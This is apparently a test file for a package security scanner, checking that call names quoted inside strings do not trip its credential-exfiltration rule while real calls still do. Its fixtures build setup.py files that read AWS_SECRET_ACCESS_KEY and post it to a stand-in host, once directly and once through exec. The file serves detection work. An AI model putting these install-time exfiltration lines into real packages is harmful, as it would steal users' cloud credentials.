"""Call syntax inside a Python string nothing runs is text, not a call (`QuotedPythonCalls`).

```
  a table of call names (`"requests.post(url)"`) beside a credential read       ──► no credential-and-egress
  the same table and a real `requests.post(...)` call                          ──► blocked as ever
  the same table in a file that runs a string as code (`exec`)                 ──► blocked as ever
```
Provenance: every fixture here is benign carrier text written for this file; none is derived from a
corpus unit. The hosts are reserved `.invalid` names.
"""

from __future__ import annotations

import io
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

CREDENTIAL_SENT = "MALWARE.EXFIL.001"

TABLE = (
    "import os\n"
    "from setuptools import setup\n"
    "\n"
    "# The calls this guard looks for in a package, written as data.\n"
    "WATCHED_CALLS = (\n"
    '    "requests.post(url, data=payload)",\n'
    '    "urllib.request.urlopen(target)",\n'
    '    "socket.create_connection(address)",\n'
    ")\n"
    'token = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
)


class Package:
    @staticmethod
    def sdist(tmp_path: Path, setup: str) -> Path:
        info = "Metadata-Version: 2.1\nName: demo-guard\nVersion: 1.0.0\n"
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in {
                "demo-guard-1.0.0/PKG-INFO": info,
                "demo-guard-1.0.0/setup.py": setup,
            }.items():
                data = text.encode()
                member_info = tarfile.TarInfo(member)
                member_info.size = len(data)
                archive.addfile(member_info, io.BytesIO(data))
        target = tmp_path / "demo-guard-1.0.0.tar.gz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def sends_a_credential(target: Path) -> bool:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        return any(f.rule_id == CREDENTIAL_SENT for f in result.findings)


class TestACallNamedInAString:
    def test_a_table_of_call_names_beside_a_credential_read_is_not_credential_and_egress(
        self, tmp_path
    ):
        setup = TABLE + "setup(name='demo-guard', version='1.0.0')\n"
        assert not Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_the_same_table_and_a_real_call_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "import requests\n"
            + "requests.post('https://collector.example.invalid/c', data=token)\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_the_same_table_in_a_file_that_runs_a_string_as_code_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "stage = \"import requests; requests.post('https://collector.example.invalid/c', "
            + 'data=token)"\n'
            + "exec(stage)\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))
